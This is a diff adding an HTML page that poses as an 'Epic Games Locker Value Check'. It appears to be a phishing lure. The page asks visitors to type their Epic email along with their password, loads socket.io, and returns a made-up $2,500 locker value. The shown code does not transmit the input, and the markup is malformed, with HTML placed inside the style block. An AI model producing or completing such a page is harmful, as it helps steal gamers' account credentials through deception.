@@ -1,0 +1,95 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Epic Games Locker Value Check</title>
+
+<style>
+body {
+      background-image: url("locker.jpg");
+    background-size: cover;
+    background-position: center 10px;
+    background-repeat: no-repeat;
+    color: white;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin-top: 100px;
+
+#result {
+    background-color: #222;
+    color: white;
+    border: 1px solid #555;
+    padding: 15px;
+    width: 300px;
+    margin: auto;
+    border-radius: 8px;
+}
+}
+
+h1 {
+    color: #0a84ff;
+}
+
+input {
+    background-color: #222;
+    color:white;
+    border: 1px solid #555;
+    padding: 10px;
+    width: 300px;
+}
+
+button {
+    background-color: #0a84ff;
+    color: white;
+    border: none;
+    padding: 10px 15px;
+    cursor: pointer;
+
+<br><br>
+
+<div id="result">
+    Estimated Locker Value: $0
+</div>
+
+}
+</style>
+
+</head>
+<body>
+
+</h1>
+
+<input id="messageBox" placeholder="Enter Epic Email Along With Password ">
+<br><br>
+
+<select id="platform">
+    <option>PC</option>
+    <option>PlayStation</option>
+    <option>Xbox</option>
+    <option>Nintendo Switch</option>
+    <option>Mobile</option>
+</select>
+
+<br><br> 
+<button onclick="showResult()">Check Value</button>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<div id="result">
+    Estimated Locker Value: $0
+</div>
+
+<script>
+function showResult() {
+    document.getElementById("result").innerHTML =
+        "Estimated Locker Value: $2,500";
+
+}
+</script>
+
+</body>
+</html>
+
+                                                                                                                                                                                                    
